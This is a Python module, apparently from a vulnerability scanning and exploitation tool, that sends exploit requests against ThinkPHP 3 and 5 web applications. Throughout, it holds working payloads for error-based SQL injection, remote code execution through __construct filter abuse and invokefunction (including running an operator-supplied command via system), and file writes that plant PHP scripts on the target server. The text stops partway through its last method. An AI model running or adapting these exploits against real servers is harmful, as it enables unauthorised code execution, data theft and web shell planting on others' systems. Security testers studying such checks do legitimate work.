from util.ExpRequest import ExpRequest,Output
from ClassCongregation import random_name
from operator import methodcaller
from urllib.parse import quote
import prettytable as pt
import base64
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class ThinkPHP():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.status = env.get('status')
        
    #ThinkPHP3
    def tp3_select_find_delete_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp3_select_find_delete_sql'
        path = r'/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp3_cache_file(self):
        appName = 'thinkphp3'
        pocname = 'tp3_cache_file'
        path = r"/index.php/Home/Index/get?id=%0d%0aeval($_POST['cmd']);%0d%0a//"
        path2 = r"/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php"
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+path2, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"200" == str(r.status_code):
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp3_order_by_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp3_order_by_sql'
        path = '/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp3_update_sql(self):
        appName = 'thinkphp3'
        pocname = 'tp_update_sql'
        path = r'/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"cf67355a3333e6e143439161adc2d82" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
    
    #ThinkPHP5
    def tp5_construct_code_exec_1(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_1'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_construct_code_exec_2(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_2'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&method=GET&filter[]=var_dump&get[]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_construct_code_exec_3(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_3'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method=POST&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_construct_code_exec_4(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_code_exec_4'
        path = '/index.php?s=captcha'
        method = 'post'
        desc = '[rce]'
        data = 'aaaa=VuLnEcHoPoCSuCCeSS&_method=__construct&method=GET&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_construct_code_exec_5(self):
        appName = 'thinkphp5'
        pocname = 'tp5_construct_code_rce_5'
        path = '/index.php'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp5_construct_code_exec_6(self):
        appName = 'thinkphp5'
        pocname = 'tp5_construct_code_exec_6'
        path = '/index.php?s=index/index/index'
        method = 'post'
        desc = '[rce]'
        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method&filter[]=var_dump'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"string(18) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_construct_debug_rce(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_construct_debug_rce'
        path = '/index.php'
        method = 'post'
        desc = '[rce]'
        data = '_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_debug_index_ids_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp5_debug_index_ids_sqli'
        path = '/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"cf67355a3333e6e143439161adc2d82" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_driver_display_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_driver_display_rce'
        path = r'/index.php?s=index/\think\view\driver\Php/display&content=<?php var_dump(md5(2333));?>'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"4f97319b308ed6bd3f0c195c176bbd77" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_invoke_func_code_exec_1(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_invoke_func_code_exec_1'
        path = r'/index.php?s=index/think\app/invokefunction&function=phpinfo&vars[0]=-1'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                path = r'/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=RECOMMAND'
                result = exprequest.get(self.url+path.replace('RECOMMAND', self.cmd), data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_invoke_func_code_exec_2(self):
        appName = 'ThinkPHP'
        pocname = 'tp5_invoke_func_code_exec_2'
        path = r'/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp5_invoke_func_code_exec_3(self):
        appName = 'thinkphp5'
        pocname = 'tp5_invoke_func_code_exec_3'
        path = r'/index.php/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1'
        method = 'get'
        desc = '[rce]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))


    def tp5_method_filter_code_exec(self):
        appName = 'thinkphp'
        pocname = 'tp5_method_filter_code_exec'
        path = '/index.php'
        method = 'post'
        desc = '命令执行描述'
        data = 'c=var_dump&f=md5(2333)&_method=filter'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"f7e0b956540676a129760a3eae309294" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp5_request_input_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_request_input_rce'
        path = r'/index.php?s=index/\think\Request/input&filter=var_dump&data=md5(2333)'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"f7e0b956540676a129760a3eae309294" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_templalte_driver_rce(self):
        appName = 'thinkphp'
        pocname = 'tp5_templalte_driver_rce'
        path1 = r'/index.php?s=index/\think\template\driver\file/write&cacheFile=mqz.php&content=<?php var_dump(md5(2333));?>'
        path2 = '/mqz.php'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path1, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+path2, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path1, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            

    def tp5_query_max_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_query_max_sql'
        path = r'/index.php/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp5_Builder_parseData_insert_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_Builder_parseData_sql'
        path = '/index.php/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp5_Builder_parseData_orderby_sql(self):
        appName = 'thinkphp'
        pocname = 'tp5_Builder_parseData_orderby_sql'
        path = r'/index.php/index/index/index?order%20by\[id\`\|updatexml(1,concat(0x7,user(),0x7e),1)%23\]=1'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_Mysql_parseWhereItem_select_sql(self):
        appName = 'thinkphp5'
        pocname = 'tp5_Mysql_parseWhereItem_select_sql'
        path = r'/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23'
        method = 'get'
        desc = '[sql]'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"XPATH" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
            
    def tp5_cache_include_file(self):
        appName = 'thinkphp5'
        pocname = 'tp5_cache_include_file'
        method = 'post'
        
        PHPSESSID = random_name(25)
        scriptname = random_name(6)+'.php'
        path1 = '/index.php?s=captcha'
        path2 = scriptname
        vulntxt = 'VuLnEcHoPoCSuCCeSS'
        payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
        post_param1 = r"_method=__construct&filter[]=think\Session::set&method=get&get[]={random}&server[]=1"
        post_param2 = r"_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_{random}&server[]=1"
        
        desc = '[file] '+self.url+'/'+path2
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
            "Content-type": "application/x-www-form-urlencoded",
            "Cache-Control": "no-cach",
            "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
            "Cookie": "PHPSESSID="+PHPSESSID}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "VuLnEcHoPoCSuCCeSS" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                vulntxt = self.cmd
                payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                print(desc+' '+str(r.status_code)+' length='+str(len(r.text)))
                #print(r.text)
        except Exception as error:
            output.error_output(str(error))
        
    #ThinkPHP?
    def tp_cache(self):
        appName = 'thinkphp'
        pocname = 'tp_cache'
        path = '/index.php/Home/Index/index.html'
        method = 'post'
        desc = '命令执行描述'
        data = r'a3=%0d%0avar_dump(11111);%0d%0a//'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
